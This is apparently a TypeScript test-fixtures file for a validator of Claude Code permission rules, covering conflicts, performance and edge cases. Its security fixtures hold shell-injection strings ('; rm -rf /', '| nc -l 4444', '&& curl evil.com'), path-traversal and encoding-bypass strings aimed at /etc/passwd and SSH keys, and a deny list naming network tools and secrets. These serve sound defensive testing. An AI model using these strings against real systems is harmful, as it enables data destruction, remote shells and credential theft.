/**
 * Test fixtures for validation scenarios including security test cases,
 * performance benchmarks, and edge cases
 */

import { ClaudeCodeConfiguration, ValidationResult } from '../../src/types';
import { NormalizedRule } from '../../src/validation/types';

/**
 * Security test scenarios focusing on zero-bypass enforcement
 */
export const securityScenarios = {
  /**
   * Critical zero-bypass violations that must be caught
   */
  zeroBypassViolations: [
    {
      name: 'direct-allow-overrides-deny',
      description: 'Allow rule directly contradicts deny rule',
      config: {
        permissions: {
          deny: ['exec', 'eval', 'system'],
          allow: ['exec'] // Direct violation
        }
      } as ClaudeCodeConfiguration,
      expectedViolations: 1,
      expectedSeverity: 'critical'
    },
    {
      name: 'glob-allow-overrides-specific-deny',
      description: 'Broad allow pattern overrides specific deny',
      config: {
        permissions: {
          deny: ['dangerous.exe', 'malware.dll'],
          allow: ['*'] // Overrides all deny rules
        }
      } as ClaudeCodeConfiguration,
      expectedViolations: 2,
      expectedSeverity: 'critical'
    },
    {
      name: 'ask-bypasses-deny',
      description: 'Ask rule could bypass deny through user approval',
      config: {
        permissions: {
          deny: ['/etc/*', '/root/*'],
          ask: ['/etc/passwd', '/root/.ssh/id_rsa'] // Security violations
        }
      } as ClaudeCodeConfiguration,
      expectedViolations: 2,
      expectedSeverity: 'high'
    },
    {
      name: 'pattern-encoding-bypass',
      description: 'Patterns vulnerable to encoding bypasses',
      config: {
        permissions: {
          deny: ['../config'],
          allow: ['%2e%2e/config', '..%2fconfig'] // URL encoding bypass
        }
      } as ClaudeCodeConfiguration,
      expectedViolations: 2,
      expectedSeverity: 'critical'
    }
  ],

  /**
   * Malicious patterns that should be detected
   */
  maliciousPatterns: [
    {
      name: 'shell-injection-vectors',
      description: 'Patterns that could enable shell injection',
      config: {
        permissions: {
          allow: [
            '$(whoami)',
            '`id`',
            '; rm -rf /',
            '| nc -l 4444',
            '&& curl evil.com'
          ]
        }
      } as ClaudeCodeConfiguration,
      expectedWarnings: 5
    },
    {
      name: 'path-traversal-vectors',
      description: 'Path traversal attack patterns',
      config: {
        permissions: {
          allow: [
            '../../../etc/passwd',
            '....//....//etc/passwd',
            '..\\..\\..\\windows\\system32',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
          ]
        }
      } as ClaudeCodeConfiguration,
      expectedWarnings: 4
    },
    {
      name: 'unicode-bypass-vectors',
      description: 'Unicode normalization bypass attempts',
      config: {
        permissions: {
          deny: ['../'],
          allow: [
            '\u002e\u002e\u002f', // Unicode dots and slash
            '\uff0e\uff0e\u2215', // Fullwidth variants
            '\u2024\u2024\u2044'  // Two dot leader and fraction slash
          ]
        }
      } as ClaudeCodeConfiguration,
      expectedViolations: 3
    }
  ],

  /**
   * Weak patterns that should trigger security warnings
   */
  weakPatterns: [
    {
      name: 'overly-broad-patterns',
      config: {
        permissions: {
          deny: ['*', '**', '.*'],
          allow: ['*/**', '**/*']
        }
      } as ClaudeCodeConfiguration,
      expectedIssues: 5
    },
    {
      name: 'short-exploitable-patterns',
      config: {
        permissions: {
          deny: ['.', '..', 'a', 'x']
        }
      } as ClaudeCodeConfiguration,
      expectedIssues: 4
    }
  ]
};

/**
 * Performance test scenarios for benchmarking
 */
export const performanceScenarios = {
  /**
   * Small configurations that must validate in <100ms
   */
  fastValidation: [
    {
      name: 'minimal-config',
      config: {
        permissions: {
          deny: ['exec', 'eval'],
          allow: ['read', 'write']
        }
      } as ClaudeCodeConfiguration,
      maxTimeMs: 50
    },
    {
      name: 'medium-config',
      config: {
        permissions: {
          deny: Array.from({ length: 20 }, (_, i) => `dangerous${i}`),
          allow: Array.from({ length: 30 }, (_, i) => `safe${i}/*`),
          ask: Array.from({ length: 10 }, (_, i) => `confirm${i}`)
        }
      } as ClaudeCodeConfiguration,
      maxTimeMs: 100
    }
  ],

  /**
   * Large configurations for stress testing
   */
  stressTest: [
    {
      name: 'large-ruleset-1000',
      config: {
        permissions: {
          deny: Array.from({ length: 300 }, (_, i) => `deny${i}/**`),
          allow: Array.from({ length: 500 }, (_, i) => `allow${i}/*`),
          ask: Array.from({ length: 200 }, (_, i) => `ask${i}`)
        }
      } as ClaudeCodeConfiguration,
      maxTimeMs: 5000, // 5 seconds for 1000 rules
      description: '1000 rules with complex patterns'
    },
    {
      name: 'complex-regex-patterns',
      config: {
        permissions: {
          deny: [
            '^(?:[a-zA-Z0-9+/]{4})*(?:[a-zA-Z0-9+/]{2}==|[a-zA-Z0-9+/]{3}=)?$', // Base64
            '^[a-fA-F0-9]{8}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{12}$', // UUID
            '^(?:[0-9]{1,3}\\.){3}[0-9]{1,3}$', // IP address
            '^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$' // Email
          ]
        }
      } as ClaudeCodeConfiguration,
      maxTimeMs: 200,
      description: 'Complex regex patterns that could impact performance'
    }
  ],

  /**
   * Cache performance scenarios
   */
  cachePerformance: [
    {
      name: 'repeated-validation',
      config: {
        permissions: {
          deny: ['test', 'example'],
          allow: ['safe']
        }
      } as ClaudeCodeConfiguration,
      iterations: 100,
      maxTimeMs: 1000, // 100 iterations in under 1 second with caching
      description: 'Repeated validation of same config should hit cache'
    }
  ]
};

/**
 * Edge case scenarios for robustness testing
 */
export const edgeCaseScenarios = {
  /**
   * Malformed or unusual configurations
   */
  malformedConfigs: [
    {
      name: 'empty-config',
      config: {} as ClaudeCodeConfiguration,
      shouldBeValid: true
    },
    {
      name: 'null-permissions',
      config: {
        permissions: null as any
      } as ClaudeCodeConfiguration,
      shouldBeValid: true
    },
    {
      name: 'empty-arrays',
      config: {
        permissions: {
          deny: [],
          allow: [],
          ask: []
        }
      } as ClaudeCodeConfiguration,
      shouldBeValid: true
    },
    {
      name: 'mixed-null-values',
      config: {
        permissions: {
          deny: ['valid', null as any, undefined as any, '', 'another'].filter(Boolean),
          allow: [null as any, 'test', ''].filter(Boolean)
        }
      } as ClaudeCodeConfiguration,
      shouldBeValid: true
    }
  ],

  /**
   * Boundary condition tests
   */
  boundaryConditions: [
    {
      name: 'very-long-pattern',
      config: {
        permissions: {
          deny: ['a'.repeat(10000)] // 10KB pattern
        }
      } as ClaudeCodeConfiguration,
      shouldBeValid: true,
      expectedWarnings: 1
    },
    {
      name: 'deeply-nested-path',
      config: {
        permissions: {
          deny: [Array.from({ length: 100 }, () => 'dir').join('/')]
        }
      } as ClaudeCodeConfiguration,
      shouldBeValid: true
    },
    {
      name: 'special-characters',
      config: {
        permissions: {
          deny: [
            '!@#$%^&*()_+-={}[]|\\:";\'<>?,./',
            'файл.txt', // Cyrillic
            '文件.js', // Chinese
            '🔥💀⚠️.exe' // Emojis
          ]
        }
      } as ClaudeCodeConfiguration,
      shouldBeValid: true
    }
  ],

  /**
   * Regex edge cases
   */
  regexEdgeCases: [
    {
      name: 'invalid-regex',
      config: {
        permissions: {
          deny: [
            '[invalid',
            '*{invalid}',
            '(?invalid)',
            '\\invalid'
          ]
        }
      } as ClaudeCodeConfiguration,
      shouldBeValid: true,
      expectedWarnings: 4
    },
    {
      name: 'catastrophic-backtracking',
      config: {
        permissions: {
          deny: [
            '(a+)+b', // Potential ReDoS
            '(a|a)*',
            'a*a*a*a*a*a*a*a*a*c'
          ]
        }
      } as ClaudeCodeConfiguration,
      shouldBeValid: true,
      maxTimeMs: 1000, // Should not cause timeout
      expectedWarnings: 3
    }
  ]
};

/**
 * Real-world configuration examples
 */
export const realWorldScenarios = {
  /**
   * Enterprise security configurations
   */
  enterprise: [
    {
      name: 'financial-institution',
      description: 'High-security configuration for financial services',
      config: {
        permissions: {
          deny: [
            'exec', 'eval', 'system', 'shell',
            '*.exe', '*.dll', '*.bat', '*.cmd', '*.ps1',
            '/etc/*', '/root/*', '/proc/*', '/sys/*',
            '../*', '../../*', '../../../*',
            'password', 'secret', 'private_key', 'token',
            'curl', 'wget', 'nc', 'netcat', 'ssh', 'telnet'
          ],
          allow: [
            'read/public/*',
            'write/user-data/*',
            'config/app.json',
            'logs/application.log',
            'temp/*.tmp'
          ],
          ask: [
            'admin/config/*',
            'reports/generate',
            'backup/create',
            'user/delete'
          ]
        }
      } as ClaudeCodeConfiguration,
      expectedValid: true,
      maxViolations: 0
    },
    {
      name: 'healthcare-hipaa',
      description: 'HIPAA-compliant configuration for healthcare',
      config: {
        permissions: {
          deny: [
            'patient-data/*/*',
            'phi/*',
            'medical-records/*',
            'billing/sensitive/*',
            'export/unencrypted/*'
          ],
          allow: [
            'public/forms/*',
            'templates/*',
            'documentation/*'
          ],
          ask: [
            'patient-data/view/*',
            'reports/anonymized/*',
            'export/encrypted/*'
          ]
        }
      } as ClaudeCodeConfiguration,
      expectedValid: true
    }
  ],

  /**
   * Common misconfiguration patterns
   */
  misconfigurations: [
    {
      name: 'allow-everything',
      description: 'Overly permissive configuration',
      config: {
        permissions: {
          allow: ['*', '**/*', '.*']
        }
      } as ClaudeCodeConfiguration,
      expectedValid: false,
      expectedIssues: 3
    },
    {
      name: 'conflicting-rules',
      description: 'Multiple conflicting rules',
      config: {
        permissions: {
          deny: ['admin/*', '*.exe', 'dangerous'],
          allow: ['admin/public/*', 'safe.exe', 'dangerous'], // Conflicts
          ask: ['admin/config', 'tool.exe'] // Also conflicts
        }
      } as ClaudeCodeConfiguration,
      expectedValid: false,
      expectedConflicts: 4
    }
  ]
};

/**
 * Normalized rule test fixtures
 */
export const normalizedRuleFixtures = {
  /**
   * Sample normalized rules for testing conflict detection
   */
  sampleRules: [
    {
      original: 'exec',
      normalized: 'exec',
      patternType: 'literal' as const,
      category: 'deny' as const,
      priority: -1000,
      index: 0,
      regex: /^exec$/
    },
    {
      original: '*.exe',
      normalized: '.*\\.exe',
      patternType: 'glob' as const,
      category: 'deny' as const,
      priority: -999,
      index: 1,
      regex: /.*\.exe$/
    },
    {
      original: 'safe/*',
      normalized: 'safe/.*',
      patternType: 'glob' as const,
      category: 'allow' as const,
      priority: 0,
      index: 0,
      regex: /^safe\/.*$/
    }
  ] as NormalizedRule[],

  /**
   * Conflicting rule pairs for testing
   */
  conflictingPairs: [
    {
      rule1: {
        original: 'dangerous.exe',
        normalized: 'dangerous\\.exe',
        patternType: 'literal' as const,
        category: 'deny' as const,
        priority: -1000,
        index: 0,
        regex: /^dangerous\.exe$/
      },
      rule2: {
        original: 'dangerous.exe',
        normalized: 'dangerous\\.exe',
        patternType: 'literal' as const,
        category: 'allow' as const,
        priority: 0,
        index: 0,
        regex: /^dangerous\.exe$/
      },
      expectedConflictType: 'ALLOW_OVERRIDES_DENY',
      expectedSeverity: 'critical'
    }
  ]
};

/**
 * Performance benchmarking utilities
 */
export class PerformanceBenchmark {
  private static measurements: Map<string, number[]> = new Map();

  static start(name: string): () => number {
    const startTime = performance.now();
    return () => {
      const endTime = performance.now();
      const duration = endTime - startTime;
      
      if (!this.measurements.has(name)) {
        this.measurements.set(name, []);
      }
      this.measurements.get(name)!.push(duration);
      
      return duration;
    };
  }

  static getStats(name: string) {
    const measurements = this.measurements.get(name) || [];
    if (measurements.length === 0) {
      return null;
    }

    const sorted = [...measurements].sort((a, b) => a - b);
    return {
      count: measurements.length,
      min: sorted[0],
      max: sorted[sorted.length - 1],
      mean: measurements.reduce((a, b) => a + b, 0) / measurements.length,
      median: sorted[Math.floor(sorted.length / 2)],
      p95: sorted[Math.floor(sorted.length * 0.95)],
      p99: sorted[Math.floor(sorted.length * 0.99)]
    };
  }

  static clear() {
    this.measurements.clear();
  }
}

/**
 * Test data generators for bulk testing
 */
export const testDataGenerators = {
  /**
   * Generate a configuration with specified number of rules
   */
  generateLargeConfig(
    denyCount: number,
    allowCount: number,
    askCount: number
  ): ClaudeCodeConfiguration {
    return {
      permissions: {
        deny: Array.from({ length: denyCount }, (_, i) => `deny_rule_${i}_pattern/**`),
        allow: Array.from({ length: allowCount }, (_, i) => `allow_rule_${i}_pattern/*`),
        ask: Array.from({ length: askCount }, (_, i) => `ask_rule_${i}_pattern`)
      }
    };
  },

  /**
   * Generate rules with intentional conflicts
   */
  generateConflictingConfig(conflictCount: number): ClaudeCodeConfiguration {
    const basePatterns = Array.from({ length: conflictCount }, (_, i) => `pattern${i}`);
    
    return {
      permissions: {
        deny: basePatterns,
        allow: basePatterns, // Same patterns = conflicts
        ask: []
      }
    };
  },

  /**
   * Generate complex regex patterns for performance testing
   */
  generateComplexRegexConfig(patternCount: number): ClaudeCodeConfiguration {
    const complexPatterns = [
      '^(?:[a-zA-Z0-9+/]{4})*(?:[a-zA-Z0-9+/]{2}==|[a-zA-Z0-9+/]{3}=)?$',
      '^[a-fA-F0-9]{8}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{12}$',
      '^(?:[0-9]{1,3}\\.){3}[0-9]{1,3}$',
      '^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$',
      '^(https?://)?([da-z.-]+)\\.([a-z.]{2,6})([/w.-]*)*/?$'
    ];

    return {
      permissions: {
        deny: Array.from(
          { length: patternCount },
          (_, i) => complexPatterns[i % complexPatterns.length] + `_${i}`
        )
      }
    };
  }
};